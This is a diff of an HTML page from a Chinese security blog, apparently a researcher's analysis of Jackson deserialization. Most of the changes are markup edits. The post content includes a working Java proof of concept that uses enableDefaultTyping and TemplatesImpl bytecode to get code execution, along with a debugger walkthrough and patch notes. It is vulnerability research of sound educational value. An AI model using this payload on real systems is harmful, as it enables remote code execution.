+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832516559-c7d0d954-7fe4-47f4-a91b-0a25d88f2752.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>走入<code>vanillaDeserialize</code>，在该方法中首先调用了<code>createUsingDefault</code>方法，<code>this._defaultCreator.call</code>方法调用了对应类的无参构造方法并生成实例</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832732945-bc5afe5c-ad63-47c6-9ba4-56c658fbaba3.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832859477-554134c4-8839-4649-b910-b0bff575df0b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832732945-bc5afe5c-ad63-47c6-9ba4-56c658fbaba3.png" alt="Jackson反序列化" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832859477-554134c4-8839-4649-b910-b0bff575df0b.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>接着我们回到<code>vanillaDeserialize</code>方法，这里会遍历我们Tearch类的属性值，从根据Json字符串解析的<code>key:Value</code>键值对中找到对应的值，调用<code>deserializeAndSet</code>方法，该方法用来调用对应属性的setter方法进行赋值</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832994729-6f35c034-d10b-4761-afaf-79a050543353.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832994729-6f35c034-d10b-4761-afaf-79a050543353.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>跟进<code>deserializeAndSet</code>，继续跟进<code>deserialize</code>方法，这里判断该节点的数据类型是否为NULL，如果不为NULL，则继续判断<code>_valueTypeDeserializer</code>是否为NULL，如果不是NULL则继续调用<code>this._valueDeserializer.deserialize</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755833638987-5088013f-5fa7-423d-b1e9-ef12c72fafb9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755833638987-5088013f-5fa7-423d-b1e9-ef12c72fafb9.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>在<code>VALUE_NUMBER_INT</code>为NULL的情况下调用<code>getIntValue</code>方法，否则调用<code>_parseInteger</code>，调用完成之后，会返回JSON键值对中的值</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834540205-51b25ada-2dce-4ce4-9561-372b99d7e0df.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834612438-36b32453-13d0-4d46-8ba0-ecc8e394cbe9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834540205-51b25ada-2dce-4ce4-9561-372b99d7e0df.png" alt="Jackson反序列化" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834612438-36b32453-13d0-4d46-8ba0-ecc8e394cbe9.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>回到<code>deserializeAndSet</code>方法，接下来调用<code>this._field.set</code>，该方法就用来调用对应属性的setter方法了（在该属性有setter方法的前提下）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834842695-f325185f-7b58-47e7-b603-34c3e34bec6c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834842695-f325185f-7b58-47e7-b603-34c3e34bec6c.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>对于name属性的设置，也是一样的。不一样的是，在我们对sex属性设置时，调用<code>deserialize</code>方法，我们会走到<code>deserializeWithType</code>方法处</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834980881-52d65ab3-0084-4bc0-ad42-a8c543282fac.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834980881-52d65ab3-0084-4bc0-ad42-a8c543282fac.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>跟进<code>deserializeWithType</code>方法，因为sex的value值是一个数组，这里返回的result为null，因此后面我们会走到<code>deserializeTypedFromObject</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835099060-a41e92b4-dd1b-4916-9f69-31260129f8da.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835099060-a41e92b4-dd1b-4916-9f69-31260129f8da.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>跟进<code>deserializeTypedFromObject</code>，同样因为是数组，我们会走到else if中，这里调用了<code>_deserializeTypedUsingDefaultImpl</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835368443-5f498443-952a-4ae1-ab30-de5ca4f322f5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835368443-5f498443-952a-4ae1-ab30-de5ca4f322f5.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>首先调用<code>_findDefaultImplDeserializer</code>方法，还是因为数组原因，并不会匹配任意一项，最后会调用<code>deserializeTypedFromAny</code>方法从已有类里去找</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835466391-61d05c78-7d43-42dc-9d7d-0c910dea4afd.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835466391-61d05c78-7d43-42dc-9d7d-0c910dea4afd.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>跟进<code>deserializeTypedFromAny</code>，继续跟进<code>_deserialize</code>方法，该方法中调用<code>this._findDeserializer(ctxt, typeId);</code>找到了我们的<code>com.Jackson.MySex</code>类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835652906-99778d2c-01da-4fe7-8f99-b2c0aaae9ddf.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835799536-7be85835-7f92-4104-900d-5bb494f0bf5c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835652906-99778d2c-01da-4fe7-8f99-b2c0aaae9ddf.png" alt="Jackson反序列化" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835799536-7be85835-7f92-4104-900d-5bb494f0bf5c.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>接着就会调用<code>deserialize</code>方法，后续的流程就和之前所说一样了，有点那种递归的意思</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835937801-614106f0-5d96-4d19-8138-2e98d8c2bbfa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835937801-614106f0-5d96-4d19-8138-2e98d8c2bbfa.png" alt="Jackson反序列化" loading="lazy"></p>
 <h4 id="rhUxD">小结</h4>
 
 <p>至此整个调用流程就结束了，同理使用DefaultTyping也是一样的。</p>
@@ -371,7 +392,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>Poc如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;G:\\tmp\\calcTest.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;object\&quot;:&quot;</span> +</span><br><span class="line">                <span class="string">&quot;[\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;transletBytecodes\&quot;:[\&quot;&quot;</span> + exp + <span class="string">&quot;\&quot;],\&quot;transletName\&quot;:\&quot;CulrySean\&quot;,\&quot;outputProperties\&quot;:&#123;&#125;&#125;]&#125;&quot;</span>;</span><br><span class="line">        System.out.printf(json);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(cls);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> DatatypeConverter.printBase64Binary(bytes);</span><br><span class="line">        <span class="keyword">return</span> base64Encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755842387837-454788fc-7809-4e97-8459-11ea91abcc5b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755842387837-454788fc-7809-4e97-8459-11ea91abcc5b.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>看完Poc后，根据前面分析的会调用对应属性的setter方法进行赋值，但是这条链子明显和<code>getgetOutputProperties</code>方法有关，问了一下AI，说：在反序列化的特殊情况下，只有getter方法没有setter方法，会调用getter方法，可以仔细再去分析一下源码</p>
 <h5 id="yfSKH">分析调试</h5>
 
@@ -379,23 +400,23 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>前面的部分我们不再调试，我们走到<code>vanilaDeserialize</code>方法处，一直步进到处理<code>outputProperties</code>方法处，在该方法中调用了<code>this._beanProperties.find</code>方法，我们看到<code>_beanProperties</code>的内容</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Properties=[uriresolver([simple type, <span class="keyword">class</span> <span class="title class_">javax</span>.xml.transform.URIResolver]), transletBytecodes([array type, component type: [array type, component type: [simple type, <span class="keyword">class</span> <span class="title class_">byte</span>]]]), stylesheetDOM([simple type, <span class="keyword">class</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.DOM]), transletName([simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]), outputProperties([map type; <span class="keyword">class</span> <span class="title class_">java</span>.util.Properties, [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String] -&gt; [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]])]</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846254833-83663769-9ace-49d8-8416-a8da6591942c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846254833-83663769-9ace-49d8-8416-a8da6591942c.png" alt="Jackson反序列化" loading="lazy"></p>
 <p><code>this._beanProperties.find</code>返回一个<code>SetterLessProperty</code>对象，从名字上看，就知道是在该属性值没有setter方法的情况下返回的对象，并且我们能在里面看到getter方法也就是<code>getgetOutputProperties</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846565393-9e900805-52ab-4b8e-9f9f-48a7e711d03a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846565393-9e900805-52ab-4b8e-9f9f-48a7e711d03a.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>继续向下调用<code>prop.deserializeAndSet</code>，也就是<code>SetterlessProperty.deserializeAndSet</code>，跟进看一看，就可以发现，这里不再调用setter方法而是getter方法，因此可以触发我们的payload</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846764423-817075c1-3622-457b-9efa-52b36416fb06.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846764423-817075c1-3622-457b-9efa-52b36416fb06.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>最后走到<code>getgetOutputProperties</code>方法触发漏洞</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846888925-9d88fb5c-c089-4cbd-8fcc-05d98eb40ac6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846888925-9d88fb5c-c089-4cbd-8fcc-05d98eb40ac6.png" alt="Jackson反序列化" loading="lazy"></p>
 <h4 id="bmmKZ">高版本JDK限制</h4>
 
 <p>在一些大版本下，JDK1.7、JDK1.8中的TemplatesImpl类是有所区别的</p>
 <p>大版本下，无法触发payload的原因在于，新建TransletClassLoader类的代码中，调用了<code>_factory</code>属性，但是该属性为null，因此会抛出异常</p>
 <p>同时在Jackson中也无法设置<code>_tfactory</code>，因为该属性没有对应的getter和setter方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847300150-d0a9ba33-b63d-47f6-ab9f-e9c7a243d518.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847300150-d0a9ba33-b63d-47f6-ab9f-e9c7a243d518.png" alt="Jackson反序列化" loading="lazy"></p>
 <h4 id="M6VmS">补丁修复</h4>
 
 <p>在调用 <code>BeanDeserializerFactory.createBeanDeserializer</code> 函数创建 Bean 反序列化器的时候，其中会调用 <code>checkIllegalTypes</code> 函数提取当前类名，然后使用黑名单进行过滤：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847421582-c3f956f2-4732-4ff0-92cb-f6b97a39aca0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847421582-c3f956f2-4732-4ff0-92cb-f6b97a39aca0.png" alt="Jackson反序列化" loading="lazy"></p>
 
       </div>
       
@@ -411,13 +432,13 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/08/27/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>EventListenerList触发任意toString</strong>
       </a>
     
     
-      <a href="/2025/08/19/RMI%E5%9F%BA%E7%A1%80/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/08/19/RMI%E5%9F%BA%E7%A1%80/">
+        <span>更早一篇</span>
         <strong>RMI基础</strong>
       </a>
     
@@ -431,9 +452,9 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
